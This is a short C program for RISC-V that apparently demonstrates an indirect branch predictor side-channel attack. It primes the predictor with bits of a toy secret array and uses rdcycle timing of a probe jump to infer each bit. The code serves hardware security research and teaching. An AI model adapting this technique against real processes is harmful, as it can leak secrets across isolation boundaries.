#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>

#define SECRET_LEN    8
#define ATTACK_ROUNDS 1000 

volatile uint8_t sec_data[SECRET_LEN] = {1,0,0,1,0,1,0,1};
volatile uint8_t array1[1]          = {1};  

static inline uint64_t time(void) {
    uint64_t v;
    asm volatile("fence iorw, iorw" ::: "memory");
    asm volatile("rdcycle %0" : "=r"(v));
    asm volatile("fence iorw, iorw" ::: "memory");
    return v;
}

void indirJump(int val) {
    void *target_addr = (void *)( val ? &&T2 : &&T1 );
    goto *target_addr;

    T1: asm volatile("nop\n" "nop\n");
        return;
    T2: asm volatile("nop\n" "nop\n");
        return;
}

int main(void) {
    printf("IBPA with indirJump helper (rdcycle timing)\n");
    printf("secret: ");
    for (int i = 0; i < SECRET_LEN; ++i) printf("%d ", (int)sec_data[i]);
    printf("\nATTACK_ROUNDS = %d\n\n", ATTACK_ROUNDS);

    for (int idx = 0; idx < SECRET_LEN; ++idx) {
        uint64_t sum_cycles = 0;

        for (int k = 0; k < ATTACK_ROUNDS; ++k) {
            indirJump((int)sec_data[idx]);

            uint64_t t0 = time();
            indirJump((int)array1[0]);
            uint64_t t1 = time();

            sum_cycles += (t1 - t0);
        }

        double mean_cycles = (double)sum_cycles / (double)ATTACK_ROUNDS;
        printf("Index %d: mean_probe = %.2f cycles (over %d rounds)\n", idx, mean_cycles, ATTACK_ROUNDS);
    }

    return 0;
}